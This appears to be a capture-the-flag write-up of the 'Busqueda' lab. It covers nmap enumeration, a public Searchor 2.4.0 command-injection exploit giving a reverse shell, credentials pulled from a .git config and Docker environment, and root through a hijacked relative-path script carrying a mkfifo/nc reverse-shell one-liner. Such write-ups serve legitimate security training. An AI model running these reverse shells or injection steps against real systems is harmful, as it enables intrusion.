## Busqueda

### Lab Details 

- Difficulty: Easy  
- Type:Web App, SSRF, Gitea, Docker, Priv Esc, Linux
#### Initial Foothold
- run Nmap
```
PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp   open  http       syn-ack Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Searcher
|_http-server-header: Apache/2.4.52 (Ubuntu)
9002/tcp open  tcpwrapped syn-ack
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
```
- enumerate web app on port 80
	- the version of the application `Searcher` is `2.4.0`
	- found POC for this version of the application: https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
```
$ ./exploit.sh http://searcher.htb/ 10.10.16.20 4444
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is http://searcher.htb/
[*] Input attacker is 10.10.16.20:4444
[*] Run the Reverse Shell... Press Ctrl+C after successful connection

## on attacker
$ nc -lvnp 4444                                
listening on [any] 4444 ...
connect to [10.10.16.20] from (UNKNOWN) [10.10.11.208] 56156
svc@busqueda:/var/www/app$ whoami
whoami
svc
```
#### Privilege Escalation
- we are able to get access to user `svc` from the POC however no further actions can be done with the account 
- check for the `app` directory, contains `.git`
- `./config` file contains the ssh password of user SVC to the server
- it also contains information of the second application hosted on the server `gitea.searcher.htb` 
- the new domain need to be added to `/etc/hosts`
```
svc@busqueda:/var/www/app/.git$ cat ./config
cat ./config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```
 - ssh into the server with `SVC` credential and run `sudo -l`
```
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py * 
```
- by running the script `system-checkup.py` as `root`, we can see that the script takes in 3 parameters
- running `docker-ps` shows a list of running docker containers
- running `docker-inspect` inspects a certain docker container
- we can use `docker-inspect` to check configs of a running docker container
```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
     
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS        PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up 22 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up 22 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea| jq

<snip>
    "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],
<snip>
```
- running `docker-inspect` on the `gitea` docker gives up the password to `mysql` database
- we can then attempt reuse the credential to login to `gitea.searcher.htb`
![[gitea scripts.png]]
- on line 47 of the `system-checkup.py` script its calling the `full-checkup.sh` script from a relative path which can be vulnerable to file injection attack
- to exploit this, create a new file with the same name as `full-checkup.sh` in a directory and run the `system-checkup.py` in that directory
```
svc@busqueda:/tmp$ cat full-checkup.sh 
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.20 9002 >/tmp/f

svc@busqueda:/tmp$ ls -la
total 68
drwxrwxrwt 16 root root 4096 Jul 22 13:49 .
drwxr-xr-x 19 root root 4096 Mar  1  2023 ..
drwxrwxrwt  2 root root 4096 Jul 21 15:36 .font-unix
-rwxrwxr-x  1 svc  svc    81 Jul 22 13:49 full-checkup.sh
drwxrwxrwt  2 root root 4096 Jul 21 15:36 .ICE-unix
drwx------  3 root root 4096 Jul 21 15:36 snap-private-tmp
drwx------  3 root root 4096 Jul 21 15:36 systemd-private-3c593bb6d4834a77a1587c3df2af7be7-apache2.service-7tFy3s
drwx------  3 root root 4096 Jul 21 15:36 systemd-private-3c593bb6d4834a77a1587c3df2af7be7-ModemManager.service-j1f6Nx
drwx------  3 root root 4096 Jul 21 15:36 systemd-private-3c593bb6d4834a77a1587c3df2af7be7-systemd-logind.service-S2sPFo
drwx------  3 root root 4096 Jul 21 15:36 systemd-private-3c593bb6d4834a77a1587c3df2af7be7-systemd-resolved.service-I7R0Jw
drwx------  3 root root 4096 Jul 21 15:36 systemd-private-3c593bb6d4834a77a1587c3df2af7be7-systemd-timesyncd.service-VzeIbv                drwx------  3 root root 4096 Jul 21 18:06 systemd-private-3c593bb6d4834a77a1587c3df2af7be7-upower.service-H2ubEQ
drwxrwxrwt  2 root root 4096 Jul 21 15:36 .Test-unix
drwx------  2 svc  svc  4096 Jul 22 10:24 tmux-1000
drwx------  2 root root 4096 Jul 21 15:36 vmware-root_777-4281777711
drwxrwxrwt  2 root root 4096 Jul 21 15:36 .X11-unix
drwxrwxrwt  2 root root 4096 Jul 21 15:36 .XIM-unix
svc@busqueda:/tmp$ vim full-checkup.sh
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-check

## on attacker
$ nc -lvnp 9002                                
listening on [any] 9002 ...
connect to [10.10.16.20] from (UNKNOWN) [10.10.11.208] 34120
root@busqueda:/tmp# whoami 
whoami
root
```

#### Resources

#### Lesson Learned
